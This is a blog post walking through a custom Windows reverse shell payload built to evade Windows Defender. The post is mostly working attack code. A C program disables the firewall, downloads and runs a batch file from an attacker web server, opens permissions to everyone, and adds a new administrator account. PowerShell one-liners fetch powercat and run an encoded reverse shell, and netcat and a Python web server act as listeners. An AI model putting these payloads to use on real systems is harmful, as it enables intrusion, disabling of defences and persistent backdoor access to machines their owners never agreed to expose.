---
layout: post
title: "Creating Customized Windows Reverse Shell Payloads"
author: "joelczk"
tags: Vulns
excerpt_separator: <!--more-->
---
A simple and quick guide to generating Windows reverse shell payloads ....
<!--more-->

## Introduction
More often that not whenever we are able to exploit a remote code execution vulnerability on a vulnerable Windows machine, we would be faced with the problem that we 
are unable to upload our reverse shell payloads onto the target server. There are a few causes of this scenario:
- Windows Defender software detected the payload as malicious and quarantined and/or removed the payload
- Firewall that filters suspicious outgoing connections
- Threat monitoring/detection software that detects and removes the payload.

One way of bypassing such restrictions would be to generate reverse shell payloads using ```msfvenom```. However, such a bypass might not be viable in all cases as ```msfvenom``` payloads are payloads with known signatures and so, these payloads would often be detected and removed even before it can be executed. As such, creating our own customized payloads are essential in such cases. 

In this article, we will be looking into creating a reverse shell payload that can bypass Windows Defender software and switch off the firewall. At the same time, the
payload will also be able to create a new user that has the permissions to rdp into the remote Windows server.

_NOTE: Some of the permissions can only be exploited if the target user of the vulnerable Windows server is a SYSTEM user (i.e. ```NT AUTHORITY/SYSTEM```)_

## Creating the payload
To start off, we will have to create a main payload as shown below. But first, let us go over what the payload does:
- The first ```system``` command disables the firewall which bypasses the filtering of suspicious network traffic by the firewall
- The second ```system``` command downloads the exploit script (```payload.bat```) from our local web server and saves it to C:\Windows\Tasks\payload.bat. The reason why we did not use the temp directory is because this directory is often heavily monitored and the payloads are often removed even before they can be executed
- The third ```system``` command serves as a sanity check to check if the script is executing correctly. If it is executing correctly, we should see ICMP connections in wireshark when we filter for ICMP
- The fourth ```system``` commands executes our payload.bat using the ```START``` command. The reason why this was done was to account for circumstances where powershell.exe was removed as a mitigation mechanism and we are unable to execute the reverse shell connections from ```powershell.exe``` or ```cmd.exe```
- The fifth ```system``` command grants access to the C:/Windows/Tasks directory to all the users so that any user can spawn and execute the reverse shell connection
- The sixth and seventh ```system``` command creates a new user and adds the new user to the ```administrators``` group respective. The main purpose is to create a new user with Administrator privileges that is able to rdp into the remote vulnerable server. However, this can only work if port 3389 is open

```c
#include <stdlib.h>
int main ()
{
    int i;
    i = system ("netsh advfirewall set allprofiles state off");
    i = system ("powershell.exe -c (New-Object System.Net.Webclient).DownloadFile('http://{WEB_HOST}:{WEB_PORT}/payload.bat','C:\\Windows\\Tasks\\payload.bat')");
    i = system ("ping -n 1 host");
    i = system ("START /B c:\\Windows\\Tasks\\payload.bat");
    i = system ("icacls c:\\Windows\\Tasks\\* /c /t /grant everyone:f");
    // Creates new user and add them to administrators group
    i = system ("cmd /c net user {user} {password} /add");
    i = system ("cmd /c net localgroup administrators {user} /add");
    return 0;
}
```

Next, we will have to compile the C code into a Windows executable. This can be easily achieved using ```i686-w64-mingw32-gcc```

```
/usr/bin/i686-w64-mingw32-gcc payload.c -o payload.exe
```

Afterwards, we will be using [PowerCat](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1) to generate an encoded reverse shell payload. This is done to bypass Windows Defender software or potential threat monitoring softwares that might pick up reverse shell connections. PowerCat is a powershell script that can mimick some capabilities of NetCat to spawn a reverse shell connection. 

In the command below, we are using Kali's ```pwsh``` module to download the ```powercat.ps1``` script and executing it to create an encoded payload that can spawn a reverse shell connection and saving it to our exploit file. The functions of the payload that we are generating is similiar to using ```nc.exe -e cmd.exe {LHOST} {LPORT}```

```
pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > $EXPLOIT_FILE
```

Lastly, we will create our ```payload.bat``` script. This ```payload.bat``` script will then execute the command ```(New-Object System.Net.Webclient).DownloadString('http://{WEB_HOST}:{WEB_PORT}/{EXPLOIT_FILE}')``` , which in turn downloads our exploit file containing the encoded payload that we have created earlier, from our local file server and creates the reverse shell connection

```
START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('http://{WEB_HOST}:{WEB_PORT}/{EXPLOIT_FILE}');iex 'powershell -E $code'
```

## Exploit
To exploit this, we will have to set up a listening web server and a reverse shell listener on our local machine

```
// Sets up listening web server
python3 -m http.server {WEB_PORT}
// Sets up reverse shell listener
nc -nlvp {REV_PORT}
```

Afterwards, executing our ```payload.exe``` binary that we have created earlier will then download the ```payload.bat``` file from our listening web server which in turns spawns a reverse shell connection to our reverse shell listener. And TADA we  have successfully obtained a reverse shell!

## Acknowledgements
The following post(s) were referenced during my research on this topic:
- [https://medium.com/@minix9800/exploit-eternal-blue-ms17-010-for-window-7-and-higher-custom-payload-efd9fcc8b623](https://medium.com/@minix9800/exploit-eternal-blue-ms17-010-for-window-7-and-higher-custom-payload-efd9fcc8b623)
